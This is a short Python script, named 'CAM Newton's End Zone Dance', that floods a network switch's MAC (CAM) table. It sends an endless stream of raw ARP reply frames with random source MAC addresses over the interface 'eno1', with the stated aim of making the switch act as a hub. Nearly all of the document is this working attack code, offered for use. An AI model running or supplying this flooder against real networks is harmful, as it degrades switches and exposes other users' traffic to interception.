#!/usr/bin/env python

"""CAM Newton's End Zone Dance

Floods a switch's CAM table with random MAC addresses, making it
start behaving as a hub.

TODO:
- argparse to set options
- check input for validity

"""

import re
import socket
import struct
import random
import time

def random_mac():
    """Returns a random MAC address string in 00:00:00:00:00:00 format"""
    mac = ''
    for _ in range(6):
        mac += format(random.randint(0, 255), 'x').zfill(2)
        mac += ':'
    return mac[:-1]  # strip off last ':'


def is_valid_mac(mac):
    """Determine if a string is a valid MAC address"""
    result = re.match("[0-9a-f]{2}([:])[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$",
                      mac.lower())
    if result:
        return True
    return False


def binary_mac(mac):
    """Converts a MAC address in 00:00:00:00:00:00 format to binary"""
    if not is_valid_mac(mac):
        return None

    return struct.pack("!6B", *[int(x, 16) for x in mac.split(':')])


def is_valid_ip(ip_address):
    """Determine if a string is a valid IP in x.x.x.x format"""
    try:
        socket.inet_aton(ip_address)
    except socket.error:
        return False

    if len(ip_address.split('.')) == 4:
        return True
    return False


def binary_ip(ip_address):
    """Converts an IP address in x.x.x.x format to binary"""
    if not is_valid_ip(ip_address):
        return None

    return struct.pack("!4B", *[int(octet) for octet in ip_address.split('.')])


def send_arp_reply(interface,
                   ethernet_dest_mac,
                   ethernet_source_mac,
                   ip_address,
                   is_at):
    """Send tailored ARP reply (ip is-at mac)"""
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.SOCK_RAW)
    sock.bind((interface, socket.SOCK_RAW))

    # Referenced http://www.networksorcery.com/enp/protocol/arp.htm
    # to build this.
    frame = [
        # Ethernet header
        # |Preamble|Destination MAC|Source Mac|Ethertype|Data|CRC|
        # Preamble handled by sock.send()
        binary_mac(ethernet_dest_mac),
        binary_mac(ethernet_source_mac),
        struct.pack("!H", 0x0806),  # Ethertype 0x0806 = ARP protocol

        # Data
        # ARP
        # |HWtype|ProtoType|MACLen|ProtoAddrLen|opcode|sMAC|sIP|DestMAC|DestIp|
        struct.pack("!H", 0x0001),        # Hardware type 1 = Ethernet
        struct.pack("!H", 0x0800),        # Protocol type = 0x0800
        struct.pack("!B", 0x06),          # Hardware Address Length = 6 bytes
        struct.pack("!B", 0x04),          # Protocol Address Length = 4 bytes
        struct.pack("!H", 0x0002),        # Operation Code = 2 (Reply/is-at)
        binary_mac(is_at),                # is-at MAC
        binary_ip(ip_address),            # is-at IP
        binary_mac("00:00:00:00:00:00"),  # Not needed here, so NULL it out
        binary_ip("0.0.0.0"),             # Not needed here, so NULL it out
        # Pad with NULL to get to 60 bytes
        struct.pack("!18B", *[int(x) for x in '0' * 18])
    ]

    sock.send(''.join(frame))
    sock.close()

def main():
    """Main function"""

    print "Flooding CAM table"

    while True:
        send_arp_reply("eno1",
                       #"ff:ff:ff:ff:ff:ff",
                       "ff:ff:aa:bb:cc:dd",
                       random_mac(),
                       "54.54.54.54",
                       "aa:aa:aa:aa:aa:aa")
        #time.sleep(0.05)


if __name__ == "__main__":
    main()
